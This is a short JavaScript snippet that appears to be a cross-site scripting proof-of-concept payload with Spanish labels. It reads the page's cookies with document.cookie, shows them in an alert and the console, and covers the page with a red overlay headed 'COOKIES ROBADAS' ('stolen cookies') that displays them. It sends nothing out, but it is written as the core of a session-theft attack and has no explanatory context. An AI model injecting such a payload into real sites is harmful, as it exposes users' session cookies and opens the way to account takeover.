(function(){
var c=document.cookie;
alert('COOKIES: '+c);
console.log('COOKIES ROBADAS:',c);
var div=document.createElement('div');
div.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:18px;padding:20px;z-index:9999;overflow:auto';
div.innerHTML='<h1>🔓 COOKIES ROBADAS</h1><p style="word-break:break-all;background:black;padding:10px;border-radius:5px">'+c+'</p>';
document.body.appendChild(div);
})();
